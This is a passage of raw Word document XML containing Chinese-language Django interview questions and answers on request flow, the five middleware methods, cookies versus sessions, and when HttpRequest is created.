      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(request)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，这个请求回去访问视图函数，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71760D0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（如果不涉及到数据调用，那么这个时候视图函数返回一个模板也就是一个网页给用户），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DEB0E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视图函数调用模型，模型去数据库查找数据，然后逐级返回，视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7235E615" w14:textId="0DF28E28" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="006B2B8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lastRenderedPageBreak/>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>78</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、中间件的执行流程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C8B51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r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中间件是介于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理之间的一道处理过程，相对比较轻量级，并且在全局上改变</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的输入与输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D8A1D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t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求过来，中间件拦截部分请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（比如验证</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，没有登录的请求一些页面，跳转至登录页）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC6084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t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，分发请求到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B377A3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t>3.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>FBV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>templates</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面渲染返回给用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A581FD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r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>并能传递参数实例化其他</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CB4E9B" w14:textId="7498BAEB" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="002111E5">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79</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>列举</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>个方法</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F936AAB"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1.process_request : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求进来时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权限认证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55702492"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2.process_view : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>路由匹配之后</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能够得到视图函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A37D805"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3.process_exception : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>异常时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B670FA2"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4.process_template_response : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模板渲染时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCF8F33"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5.process_response : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求有响应时执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B546BC" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="00FD3F5C">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="645A2FB6" wp14:editId="72E55439">
            <wp:extent cx="7935595" cy="2154555"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="187" name="图片 1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7967125" cy="2163721"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="39675E68" w14:textId="5A20A7E0" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="002111E5">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80</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、简述什么是会话，简述</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9D99E4"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所谓的会话过程就是指从打开浏览器到关闭浏览器的过程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32259F10"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最浅显的就是储存位置的不同（借鉴一下别人的图）存储数据量不同，安全性不同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6853FD7B"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以文本文件格式存储在浏览器中，而</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存储在服务端</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79303B43"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2</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的存储限制了数据量，只允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4KB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，而</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是无限量的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5E628A"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3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）我们可以轻松访问</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值但是我们无法轻松访问会话值，因此它更安全</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F722E0"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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）设置</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时间可以使</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过期。但是使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session-destory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>（），我们将会销毁会话。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B4C3D3" w14:textId="7196178D" w:rsidR="006B2B80" w:rsidRPr="00FD3F5C" w:rsidRDefault="006B2B80" w:rsidP="00FD3F5C">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62DCF941" wp14:editId="525317D7">
            <wp:extent cx="6094095" cy="2436495"/>
            <wp:effectExtent l="0" t="0" r="1905" b="1905"/>
            <wp:docPr id="186" name="图片 18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094095" cy="2436495"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA9947C" w14:textId="2B340605" w:rsidR="00024E97" w:rsidRPr="00CF0D9D" w:rsidRDefault="00024E97"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0</w:t>
      </w:r>
      <w:r w:rsidR="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>81</w:t>
      </w:r>
      <w:r w:rsidR="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象是在什么时候创建的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBC323B" w14:textId="77777777" w:rsidR="00D8288D"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770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGIHandler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>base</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>BaseHandler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB21C0A" w14:textId="014F715A"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
